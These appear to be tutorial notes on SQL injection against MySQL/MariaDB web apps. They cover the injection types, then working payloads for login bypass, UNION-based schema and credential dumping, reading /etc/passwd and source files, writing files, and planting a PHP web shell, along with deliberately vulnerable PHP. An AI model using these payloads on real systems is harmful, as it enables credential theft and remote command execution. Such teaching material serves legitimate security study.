Most modern web applications utilize a database structure on the back-end. Such databases are used to store and retrieve data related to the web application, from actual web content to user information and content, and so on. To make the web applications dynamic, the web application has to interact with the database in real-time. As HTTP(S) requests arrive from the user, the web application's back-end will issue queries to the database to build the response. These queries can include information from the HTTP(S) request or other relevant information.

Many types of injection vulnerabilities are possible within web applications, such as HTTP injection, code injection, and command injection. The most common example, however, is SQL injection. A SQL injection occurs when a malicious user attempts to pass input that changes the final SQL query sent by the web application to the database, enabling the user to perform other unintended SQL queries directly against the database.

There are many ways to accomplish this. To get a SQL injection to work, the attacker must first inject SQL code and then subvert the web application logic by changing the original query or executing a completely new one. First, the attacker has to inject code outside the expected user input limits, so it does not get executed as simple user input.

# SQL syntax

SQL syntax can differ from one RDBMS to another. However, they are all required to follow the ISO standard for Structured Query Language. We will be following the MySQL/MariaDB syntax for the examples shown. SQL can be used to perform the following actions:

- Retrieve data
- Update data
- Delete data
- Create new tables and databases
- Add / remove users
- Assign permissions to these users

# MySQL CLI utility

The mysql utility is used to authenticate to and interact with a MySQL/MariaDB database. The -u flag is used to supply the username and the -p flag for the password. The -p flag should be passed empty, so we are prompted to enter the password and do not pass it directly on the command line since it could be stored in cleartext in the bash_history file.
Again, it is also possible to use the password directly in the command, though this should be avoided, as it could lead to the password being kept in logs and terminal history (Tip: There shouldn't be any spaces between '-p' and the password).


# Example of PHP vulnerable code to connect to DB

```php
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);
```

Then, the query's output will be stored in $result, and we can print it to the page or use it in any other way. The below PHP code will print all returned results of the SQL query in new lines:

```php
while($row = $result->fetch_assoc() ){
	echo $row["name"]."<br>";
}
```


Web applications also usually use user-input when retrieving data. For example, when a user uses the search function to search for other users, their search input is passed to the web application, which uses the input to search within the databases:

```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```
**If we use user-input within an SQL query, and if not securely coded, it may cause a variety of issues, like SQL Injection vulnerabilities**.

In the above example, we accept user input and pass it directly to the SQL query without sanitization. Sanitization refers to the removal of any special characters in user-input, in order to break any injection attempts.

Example:

```sql
select * from logins where username like '%$searchInput'
```

Injection code: ```'%1'; DROP TABLE users;'```

The resulting sql is:

```sql
select * from logins where username like '%1'; DROP TABLE users;'
```

The previous example of SQL injection would return an error (Error: near line 1: near "'": syntax error). This is because of the last trailing character, where we have a single extra quote (') that is not closed, which causes a SQL syntax error when executed.
To have a successful injection, we must ensure that the newly modified SQL query is still valid and does not have any syntax errors after our injection. In most cases, we would not have access to the source code to find the original SQL query and develop a proper SQL injection to make a valid SQL query. So, how would we be able to inject into the SQL query then successfully?

One answer is by using comments, and we will discuss this in a later section. Another is to make the query syntax work by passing in multiple single quotes, as we will discuss next (').

# Types of SQL injections

In simple cases, the output of both the intended and the new query may be printed directly on the front end, and we can directly read it. This is known as **In-band SQL injection**, and it has two types: **Union Based** and **Error Based**.

With **Union Based SQL injection**, we may have to specify the exact location, 'i.e., column', which we can read, so the query will direct the output to be printed there. As for **Error Based SQL injection**, it is used when we can get the PHP or SQL errors in the front-end, and so we may intentionally cause an SQL error that returns the output of our query.


In more complicated cases, we may not get the output printed, so we may utilize SQL logic to retrieve the output character by character. This is known as **Blind SQL injection**, and it also has two types: **Boolean Based** and **Time Based**.

With **Boolean Based SQL injection**, we can use SQL conditional statements to control whether the page returns any output at all, 'i.e., original query response,' if our conditional statement returns true. As for **Time Based SQL injections**, we use SQL conditional statements that delay the page response if the conditional statement returns true using the Sleep() function.


Finally, in some cases, we may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there. This is known as **Out-of-band** SQL injection.


# Example of an injection in a simple login page

The backend executed query is:

```sql
SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
```
The page takes in the credentials, then uses the AND operator to select records matching the given username and password. If the MySQL database returns matched records, the credentials are valid, so the PHP code would evaluate the login attempt condition as true. If the condition evaluates to true, the admin record is returned, and our login is validated.

Before we start subverting the web application's logic and attempting to bypass the authentication, we first have to test whether the login form is vulnerable to SQL injection. To do that, we will try to add one of the below payloads after our username and see if it causes any errors or changes how the page behaves:

- Symbol: ```', URL encoded: %27```;
- Symbol: ```", URL encoded: %22```;
- Symbol: ```#, URL encoded: %23```;
- Symbol: ```;, URL encoded: %3B```;
- Symbol: ```), URL encoded: %29```;

### OR injection
We would need the query always to return true, regardless of the username and password entered, to bypass the authentication. To do this, we can abuse the OR operator in our SQL injection.

**The MySQL documentation for operation precedence states that the AND operator would be evaluated before the OR operator**. This means that if there is at least one TRUE condition in the entire query along with an OR operator, the entire query will evaluate to TRUE since the OR operator returns TRUE if one of its operands is TRUE.

Injection payload: ```admin' or '1'='1```

Resulting SQL:

```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```

**The AND operator will be evaluated first, and it will return false. Then, the OR operator would be evalutated, and if either of the statements is true, it would return true. Since 1=1 always returns true, this query will return true, and it will grant us access**.


# Using comments in SQL injection

Just like any other language, SQL allows the use of comments as well. Comments are used to document queries or ignore a certain part of the query. We can use two types of line comments with MySQL **--** and **#**, in addition to an in-line comment /**/.

Example: 
```sql
SELECT username FROM logins; -- Selects usernames from the logins table
```

Note: In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at the end (-- -), to show the use of a space character.

Another example:
```sql
SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
```

Tip: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.

# SQL union injection

The Union clause is used to combine results from multiple SELECT statements. This means that through a UNION injection, we will be able to SELECT and dump data from all across the DBMS, from multiple tables and databases.

Example of query:
```sql
SELECT * FROM ports UNION SELECT * FROM ships;
```

Note: The data types of the selected columns on all positions should be the same.

A UNION statement **can only operate on SELECT statements with an equal number of columns**. For example, if we attempt to UNION two queries that have results with a different number of columns, we will get an error. We will find out that the original query will usually not have the same number of columns as the SQL query we want to execute, so we will have to work around that. For example, suppose we only had one column. In that case, we want to SELECT, we can put junk data for the remaining required columns so that the total number of columns we are UNIONing with remains the same as the original query.


### Retrieve the number of columns

Before going ahead and exploiting Union-based queries, we need to find the number of columns selected by the server. There are two methods of detecting the number of columns:
- Using ORDER BY
- Using UNION

The first way of detecting the number of columns is through the **ORDER BY function**, which we discussed earlier. We have to inject a query that sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.

For example, we can start with order by 1, sort by the first column, and succeed, as the table must have at least one column. Then we will do order by 2 and then order by 3 until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist. The final successful column we successfully sorted by gives us the total number of columns.

The other method is to attempt a Union injection with a different number of columns until we successfully get the results back. The first method always returns the results until we hit an error, while this method always gives an error until we get a success. We can start by injecting a 3 column UNION query:
- ```cn' UNION select 1,2,3-- -```


While a query may return multiple columns, the web application may only display some of them. So, if we inject our query in a column that is not printed on the page, we will not get its output. This is why we need to determine which columns are printed to the page, to determine where to place our injection.

# MySQL fingerprint

Before enumerating the database, we usually need to identify the type of DBMS we are dealing with. This is because each DBMS has different queries, and knowing what it is will help us know what queries to use.

First check:
- As an initial guess, if the webserver we see in HTTP responses is Apache or Nginx, it is a good guess that the webserver is running on Linux, so the DBMS is likely MySQL;
- The same also applies to Microsoft DBMS if the webserver is IIS, so it is likely to be MSSQL.


The following queries and their output will tell us that we are dealing with MySQL:

| Payload | When to Use | Expected Output | Wrong Output |
|---------|-------------|-----------------|--------------|
| SELECT @@version | When we have full query output | MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1' | In MSSQL it returns MSSQL version. Error with other DBMS.|
| SELECT POW(1,1) | When we only have numeric output | 1 | Error with other DBMS |
| SELECT SLEEP(5) |	Blind/No Output | Delays page response for 5 seconds and returns 0. | Will not delay response with other DBMS |


### Information schema database
To pull data from tables using UNION SELECT, we need to properly form our SELECT queries. To do so, we need the following information:
- List of databases
- List of tables within each database
- List of columns within each table

The **INFORMATION_SCHEMA database** contains metadata about the databases and tables present on the server. This database plays a crucial role while exploiting SQL injection vulnerabilities. As this is a different database, we cannot call its tables directly with a SELECT statement. If we only specify a table's name for a SELECT statement, it will look for tables within the same database.

### Schemata

The **table SCHEMATA in the INFORMATION_SCHEMA database** contains information about all databases on the server. It is used to obtain database names so we can then query them. The SCHEMA_NAME column contains all the database names currently present.

Example of query with UNION SQL injection:
```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

**In an union injection to find from which database the query is retrieving the data that put inside the columns we can use the fucntion database()**.
```sql
cn' UNION select 1,database(),2,3-- -
```

### Tables

Before we dump data from the dev database, we need to get a list of the tables to query them with a SELECT statement. To find all tables within a database, we can use the TABLES table in the INFORMATION_SCHEMA Database.

The TABLES table contains information about all tables throughout the database. This table contains multiple columns, but we are interested in the TABLE_SCHEMA and TABLE_NAME columns. The TABLE_NAME column stores table names, while the TABLE_SCHEMA column points to the database each table belongs to. This can be done similarly to how we found the database names. For example, we can use the following payload to find the tables within the dev database:
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

### Columns

To dump the data of the credentials table, we first need to find the column names in the table, which can be found in the COLUMNS table in the INFORMATION_SCHEMA database. The COLUMNS table contains information about all columns present in all the databases. This helps us find the column names to query a table for. The COLUMN_NAME, TABLE_NAME, and TABLE_SCHEMA columns can be used to achieve this. As we did before, let us try this payload to find the column names in the credentials table:
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
### Retrieve the interesting data
Now that we have all the information, we can form our UNION query to dump data of the username and password columns from the credentials table in the dev database. We can place username and password in place of columns 2 and 3:
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```


# Reading files

In addition to gathering data from various tables and databases within the DBMS, a SQL Injection can also be leveraged to perform many other operations, such as reading and writing files on the server and even gaining remote code execution on the back-end server.

Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation, as we will see. For example, in MySQL, the DB user must have the FILE privilege to load a file's content into a table and then dump data from that table and read files.

### DB user

First, we have to determine which user we are within the database. While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes, as only DBA are given such privileges.
To be able to find our current DB user, we can use any of the following queries:

- SELECT USER()
- SELECT CURRENT_USER()
- SELECT user from mysql.user

Our UNION injection payload will be as follows:
```sql
cn' UNION SELECT 1, user(), 3, 4-- -
```

or:
```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```

Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query:

```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```

If we had many users within the DBMS, we can add WHERE user="root" to only show privileges for our current user root:
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```

We can also dump other privileges we have directly from the schema, with the following query:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

From here, we can add WHERE grantee="'root'@'localhost'" to only show our current user root privileges. Our payload would be:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```


### LOAD_FILE

Now that we know we have enough privileges to read local system files, let us do that using the LOAD_FILE() function. The LOAD_FILE() function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the /etc/passwd file:
```sql
SELECT LOAD_FILE('/etc/passwd');
```

Similar to how we have been using a UNION injection, we can use the above query:
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```


### Another example to show code leakege

We know that the current page is search.php. The default Apache webroot is /var/www/html. Let us try reading the source code of the file at /var/www/html/search.php.
```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

If the code is rendered on the page, we can use the developers tool of browser in order to read it.


# Writing files

To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with FILE privilege enabled
2. MySQL global secure_file_priv variable not enabled
3. Write access to the location we want to write to on the back-end server

### secure_file_priv

The secure_file_priv variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, NULL means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the FILE privilege. However, MySQL uses /var/lib/mysql-files as the default folder.

So, let's see how we can find out the value of secure_file_priv. Within MySQL, we can use the following query to obtain the value of this variable:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

However, as we are using a UNION injection, we have to get the value using a SELECT statement. This shouldn't be a problem, as all variables and most configurations' are stored within the INFORMATION_SCHEMA database. MySQL global variables **are stored in a table called global_variables**, and as per the documentation, this table has two columns variable_name and variable_value.
We have to select these two columns from that table in the INFORMATION_SCHEMA database. There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. We will then filter the results to only show the secure_file_priv variable, using the WHERE clause we learned about in a previous section.

The final SQL query is the following:
```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```

### SELECT INTO OUTFILE

The SELECT INTO OUTFILE statement can be used to write data from select queries into files. This is usually used for exporting data from tables.

To use it, we can add INTO OUTFILE '...' after our query to export the results into the file we specified. The below example saves the output of the users table into the /tmp/credentials file:
```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```

It is also possible to directly SELECT strings into files, allowing us to write arbitrary files to the back-end server.
```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```


### Writing Files through SQL Injection

Let's try writing a text file to the webroot and verify if we have write permissions. The below query should write file written successfully to the /var/www/html/proof.txt file, which we can then access on the web application:
```sql
select 'file written successfully!' into outfile '/var/www/html/proof.txt'
```

The UNION injection payload would be as follows:
```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```

### Writing a web shell

```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```

This can be verified by browsing to the /shell.php file and executing commands via the 0 parameter, with ?0=id in our URL.


# Boolean based SQL injection
There are two types of blind SQL injections: boolean-based and time-based.

Boolean-based blind SQL injection is a subtype of blind SQL injection where the attacker observes the behavior of the database server and the application after combining legitimate queries with malicious data using boolean operators.


